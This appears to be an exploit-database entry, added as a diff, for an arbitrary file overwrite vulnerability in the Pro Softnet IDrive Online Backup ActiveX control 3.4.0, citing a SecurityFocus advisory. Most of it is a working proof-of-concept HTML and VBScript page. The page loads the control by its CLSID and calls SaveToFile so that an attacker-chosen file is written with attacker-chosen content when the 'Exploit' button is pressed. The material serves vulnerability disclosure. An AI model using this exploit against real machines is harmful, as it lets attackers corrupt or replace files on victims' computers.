@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/48582/info
+
+Pro Softnet IDrive Online Backup ActiveX control is prone to a vulnerability that lets attackers overwrite files with arbitrary, attacker-controlled content.
+
+An attacker can exploit this issue to corrupt and overwrite arbitrary files on a victim's computer in the context of the vulnerable application using the ActiveX control (typically Internet Explorer).
+
+IDrive Online Backup ActiveX control 3.4.0 is vulnerable; other versions may also be affected. 
+
+<html>
+<object classid=&#039;clsid:979AE8AA-C206-40EC-ACA7-EC6B6BD7BE5E&#039; id=&#039;target&#039; /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = &#039;vbscript&#039;>
+
+Sub Boom()
+arg1="FilePath\File_name_to_rewrite_or_create"
+arg2=1
+arg3="New_File_Content"
+target.Text=arg3
+target.SelStart=0
+target.SelEnd=Len(arg3)
+target.SaveToFIle arg1,arg2
+End Sub
+
+</script>
+</html>
